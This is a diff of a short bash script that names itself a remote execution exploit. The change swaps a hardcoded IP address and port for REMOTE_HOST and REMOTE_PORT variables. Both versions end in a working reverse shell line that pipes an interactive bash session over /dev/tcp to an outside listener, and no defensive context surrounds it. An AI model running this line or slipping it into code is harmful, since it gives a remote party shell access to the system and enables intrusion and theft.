@@ -1,9 +1,10 @@
 #!/usr/bin/env bash
 
-echo "Remote execution exploit - callback to /dev/tcp/192.168.43.90/8888"
+echo ${REMOTE_HOST}/${REMOTE_PORT}
+echo "Remote execution exploit - callback to /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT}"
 
 for i in $*; do 
    echo $i 
 done
 
-/bin/bash -i >& /dev/tcp/192.168.43.90/8888 0>&1
+/bin/bash -i >& /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0>&1
